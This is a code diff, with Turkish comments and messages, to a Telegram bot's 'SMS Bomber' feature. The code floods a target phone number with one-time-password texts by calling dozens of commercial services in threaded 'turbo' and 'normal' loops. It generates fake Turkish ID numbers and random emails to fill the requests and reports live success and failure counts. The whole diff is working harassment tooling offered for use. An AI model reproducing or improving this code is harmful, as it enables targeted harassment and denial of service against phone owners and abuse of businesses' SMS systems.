@@ -2699,18 +2699,34 @@ _SMS_SESSIONS = {}
 _SMS_LOCK = threading.Lock()
 
 class SendSms:
-    adet = 0
+    """SMS OTP servisleri — başarı/başarısız sayaçlı."""
     def __init__(self, phone, mail):
         rakam = []
         tcNo = ""
         rakam.append(randint(1, 9))
-        for i in range(1, 9): rakam.append(randint(0, 9))
-        rakam.append(((rakam[0]+rakam[2]+rakam[4]+rakam[6]+rakam[8])*7 - (rakam[1]+rakam[3]+rakam[5]+rakam[7])) % 10)
+        for i in range(1, 9):
+            rakam.append(randint(0, 9))
+        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
         rakam.append((sum(rakam[:10])) % 10)
-        for r in rakam: tcNo += str(r)
+        for r in rakam:
+            tcNo += str(r)
         self.tc = tcNo
         self.phone = str(phone)
-        self.mail = mail if mail else ''.join(choice(ascii_lowercase) for _ in range(22)) + "@gmail.com"
+        self.mail = mail if mail else "".join(choice(ascii_lowercase) for _ in range(22)) + "@gmail.com"
+        self.adet = 0      # başarılı
+        self.fail = 0      # başarısız
+        self.last_ok = ""  # son başarılı servis
+        self.last_fail = ""  # son başarısız servis
+
+    def _ok(self, name):
+        self.adet += 1
+        self.last_ok = name
+        return True
+
+    def _fail(self, name):
+        self.fail += 1
+        self.last_fail = name
+        return False
 
     def KahveDunyasi(self):
         try:
@@ -3327,70 +3343,179 @@ class SendSms:
             if r.status_code == 200: self.adet += 1
         except: pass
 
-def _get_sms_services():
-    return [a for a in dir(SendSms) if callable(getattr(SendSms, a)) and not a.startswith('__') and a != 'adet']
+# Sadece yeni SMS servisleri (eskiler çağrılmaz)
+_SMS_ALLOWED = {
+    "KahveDunyasi", "Wmf", "Bim", "Englishhome", "Suiste", "KimGb", "Evidea",
+    "Ucdortbes", "TiklaGelsin", "Naosstars", "Koton", "Hayatsu", "Hizliecza",
+    "Metro", "File", "Akasya", "Akbati", "Komagene", "Porty", "Tasdelen",
+    "Uysal", "Yapp", "YilmazTicaret", "Beefull", "Dominos", "Baydoner", "Pidem",
+    "Frink", "Bodrum", "KofteciYusuf", "Little", "Orwi", "Coffy", "Hamidiye",
+    "Fatih", "Sancaktepe", "Bayrampasa", "Money", "Alixavien", "Jimmykey", "Ido",
+}
 
-def _sms_worker(phone, mail, mode, limit, interval, stop_event, uid, bot_instance):
+def _get_sms_services():
+    skip = {"adet", "fail", "last_ok", "last_fail", "_ok", "_fail"}
+    return [
+        a for a in dir(SendSms)
+        if callable(getattr(SendSms, a))
+        and not a.startswith("_")
+        and a not in skip
+        and a in _SMS_ALLOWED
+    ]
+
+def _sms_status_text(phone, mode, sms, services_n, limit=None):
+    mode_txt = "🚀 Turbo" if mode == "turbo" else "⚡ Normal"
+    return (
+        f"💣 <b>SMS Bomber — Canlı</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📱 Hedef: <code>{phone}</code>\n"
+        f"⚙️ Mod: <b>{mode_txt}</b> · 🔌 {services_n} servis\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"✅ Başarılı: <b>{sms.adet}</b>\n"
+        f"❌ Başarısız: <b>{sms.fail}</b>\n"
+        f"📊 Toplam deneme: <b>{sms.adet + sms.fail}</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🟢 Son OK: <code>{sms.last_ok or '—'}</code>\n"
+        f"🔴 Son Fail: <code>{sms.last_fail or '—'}</code>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🛑 /smsstop · 📊 /smsstatus"
+    )
+
+def _sms_worker(phone, mail, mode, limit, interval, stop_event, uid, bot_instance, status_mid=None, chat_id=None):
     sms = SendSms(phone, mail)
     services = _get_sms_services()
-    count = 0
+    last_edit = 0
     try:
+        def _tick(force=False):
+            nonlocal last_edit
+            now = time.time()
+            if not force and now - last_edit < 2.5:
+                return
+            last_edit = now
+            with _SMS_LOCK:
+                if uid in _SMS_SESSIONS:
+                    _SMS_SESSIONS[uid]["count"] = sms.adet
+                    _SMS_SESSIONS[uid]["fail"] = sms.fail
+                    _SMS_SESSIONS[uid]["last_ok"] = sms.last_ok
+                    _SMS_SESSIONS[uid]["last_fail"] = sms.last_fail
+            if status_mid and chat_id:
+                try:
+                    bot_instance.edit_message_text(
+                        _sms_status_text(phone, mode, sms, len(services), limit),
+                        chat_id, status_mid, parse_mode="HTML"
+                    )
+                except Exception:
+                    pass
+
         if mode == "turbo":
             while not stop_event.is_set():
                 threads = []
+                before = sms.adet
                 for fn in services:
-                    if stop_event.is_set(): break
-                    try:
-                        t = threading.Thread(target=getattr(sms, fn), daemon=True)
-                        threads.append(t); t.start()
-                    except: pass
+                    if stop_event.is_set():
+                        break
+                    def _run(name=fn):
+                        prev = sms.adet
+                        try:
+                            getattr(sms, name)()
+                            if sms.adet == prev:
+                                sms._fail(name)
+                            else:
+                                sms.last_ok = name
+                        except Exception:
+                            sms._fail(name)
+                    t = threading.Thread(target=_run, daemon=True)
+                    threads.append(t)
+                    t.start()
                 for t in threads:
-                    try: t.join(timeout=5)
-                    except: pass
-                count += len(services)
-                with _SMS_LOCK:
-                    if uid in _SMS_SESSIONS: _SMS_SESSIONS[uid]["count"] = count
+                    try:
+                        t.join(timeout=6)
+                    except Exception:
+                        pass
+                _tick()
+                if limit and sms.adet >= limit:
+                    stop_event.set()
+                    break
         else:
             while not stop_event.is_set():
                 for fn in services:
-                    if stop_event.is_set(): break
-                    if limit and count >= limit:
-                        stop_event.set(); break
+                    if stop_event.is_set():
+                        break
+                    if limit and sms.adet >= limit:
+                        stop_event.set()
+                        break
+                    prev = sms.adet
                     try:
                         getattr(sms, fn)()
-                        count += 1
-                        with _SMS_LOCK:
-                            if uid in _SMS_SESSIONS: _SMS_SESSIONS[uid]["count"] = count
-                    except: pass
-                if interval > 0: stop_event.wait(interval)
+                        if sms.adet == prev:
+                            sms._fail(fn)
+                        else:
+                            sms.last_ok = fn
+                    except Exception:
+                        sms._fail(fn)
+                    _tick()
+                if interval > 0:
+                    stop_event.wait(interval)
+        _tick(force=True)
     except Exception as e:
         print(f"[SMS WORKER] {e}")
     finally:
         with _SMS_LOCK:
             if uid in _SMS_SESSIONS:
                 _SMS_SESSIONS[uid]["running"] = False
-                _SMS_SESSIONS[uid]["count"] = count
+                _SMS_SESSIONS[uid]["count"] = sms.adet
+                _SMS_SESSIONS[uid]["fail"] = sms.fail
+        if status_mid and chat_id:
+            try:
+                bot_instance.edit_message_text(
+                    f"🏁 <b>SMS Bomber Bitti</b>\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"📱 Hedef: <code>{phone}</code>\n"
+                    f"✅ Başarılı: <b>{sms.adet}</b>\n"
+                    f"❌ Başarısız: <b>{sms.fail}</b>\n"
+                    f"📊 Toplam: <b>{sms.adet + sms.fail}</b>\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━",
+                    chat_id, status_mid, parse_mode="HTML"
+                )
+            except Exception:
+                pass
 
 def _launch_sms_bomb(uid, phone, mail, mode, limit, interval, bot_instance):
     with _SMS_LOCK:
         if uid in _SMS_SESSIONS and _SMS_SESSIONS[uid].get("running"):
-            bot_instance.send_message(uid, "⚠️ Zaten aktif SMS bombardımanı var!\n/smsstop ile durdurun."); return
+            bot_instance.send_message(uid, "⚠️ Zaten aktif SMS bombardımanı var!\n/smsstop ile durdurun.")
+            return
     stop_event = threading.Event()
     services = _get_sms_services()
     mode_txt = "🚀 Turbo" if mode == "turbo" else "⚡ Normal"
     limit_txt = str(limit) if limit else "Sonsuz ♾️"
     interval_txt = f"{interval}s" if mode == "normal" else "Maksimum Hız"
-    bot_instance.send_message(uid,
-        f"💣 <b>SMS Bomber Başladı!</b>\n📱 Hedef: <code>{phone}</code>\n"
-        f"📊 Servis: <b>{len(services)}</b> API\n⚙️ Mod: <b>{mode_txt}</b>\n"
-        f"🔢 Limit: <b>{limit_txt}</b>\n⏱ Aralık: <b>{interval_txt}</b>\n"
-        f"🛑 Durdurmak için: /smsstop\n📊 Durum için: /smsstatus")
-    t = threading.Thread(target=_sms_worker, args=(phone, mail, mode, limit, interval, stop_event, uid, bot_instance), daemon=True)
+    status_msg = bot_instance.send_message(
+        uid,
+        f"💣 <b>SMS Bomber Başlıyor...</b>\n"
+        f"📱 Hedef: <code>{phone}</code>\n"
+        f"📊 Servis: <b>{len(services)}</b>\n"
+        f"⚙️ Mod: <b>{mode_txt}</b>\n"
+        f"🔢 Limit: <b>{limit_txt}</b>\n"
+        f"⏱ Aralık: <b>{interval_txt}</b>\n"
+        f"✅ Başarılı: <b>0</b>\n"
+        f"❌ Başarısız: <b>0</b>\n"
+        f"🛑 /smsstop · 📊 /smsstatus",
+        parse_mode="HTML"
+    )
+    t = threading.Thread(
+        target=_sms_worker,
+        args=(phone, mail, mode, limit, interval, stop_event, uid, bot_instance, status_msg.message_id, uid),
+        daemon=True,
+    )
     with _SMS_LOCK:
-        _SMS_SESSIONS[uid] = {"running":True,"thread":t,"event":stop_event,"count":0,
-                              "target":phone,"mode":mode,
-                              "start_time":datetime.now().strftime("%H:%M:%S"),
-                              "services":len(services)}
+        _SMS_SESSIONS[uid] = {
+            "running": True, "thread": t, "event": stop_event,
+            "count": 0, "fail": 0, "last_ok": "", "last_fail": "",
+            "target": phone, "mode": mode,
+            "start_time": datetime.now().strftime("%H:%M:%S"),
+            "services": len(services), "status_mid": status_msg.message_id,
+        }
     t.start()
 
 def _sms_step1_number(msg, bot_instance):
@@ -4097,8 +4222,10 @@ def register_handlers(bot_instance):
                 bot_instance.reply_to(msg, "❌ Aktif SMS bombardımanı bulunamadı."); return
             sess = _SMS_SESSIONS[uid]; sess["event"].set(); sess["running"] = False
             bot_instance.reply_to(msg,
-                f"🛑 <b>SMS Bomber Durduruldu</b>\n📱 Hedef: <code>{sess['target']}</code>\n"
-                f"📊 Toplam Gönderilen: <b>{sess['count']}</b> SMS")
+                f"🛑 <b>SMS Bomber Durduruldu</b>\n"
+                f"📱 Hedef: <code>{sess['target']}</code>\n"
+                f"✅ Başarılı: <b>{sess.get('count', 0)}</b>\n"
+                f"❌ Başarısız: <b>{sess.get('fail', 0)}</b>")
 
     @bot_instance.message_handler(commands=["smsstatus"])
     def cmd_smsstatus(msg):
@@ -4109,9 +4236,16 @@ def register_handlers(bot_instance):
             sess = dict(_SMS_SESSIONS[uid])
             status = "🟢 Aktif" if sess.get("running") else "🔴 Durdu"
             bot_instance.reply_to(msg,
-                f"📊 <b>SMS Bomber Durumu</b>\n📱 Hedef: <code>{sess['target']}</code>\n"
-                f"📌 Durum: <b>{status}</b>\n⚙️ Mod: <b>{sess.get('mode','—').upper()}</b>\n"
-                f"📊 Gönderilen: <b>{sess['count']}</b> SMS\n🕐 Başlangıç: {sess.get('start_time','—')}")
+                f"📊 <b>SMS Bomber Durumu</b>\n"
+                f"📱 Hedef: <code>{sess['target']}</code>\n"
+                f"📌 Durum: <b>{status}</b>\n"
+                f"⚙️ Mod: <b>{str(sess.get('mode', '—')).upper()}</b>\n"
+                f"✅ Başarılı: <b>{sess.get('count', 0)}</b>\n"
+                f"❌ Başarısız: <b>{sess.get('fail', 0)}</b>\n"
+                f"🟢 Son OK: <code>{sess.get('last_ok') or '—'}</code>\n"
+                f"🔴 Son Fail: <code>{sess.get('last_fail') or '—'}</code>\n"
+                f"🕐 Başlangıç: {sess.get('start_time', '—')}\n"
+                f"🔌 Servis: {sess.get('services', 0)}")
 
     @bot_instance.message_handler(commands=["admin"])
     def cmd_admin(msg):
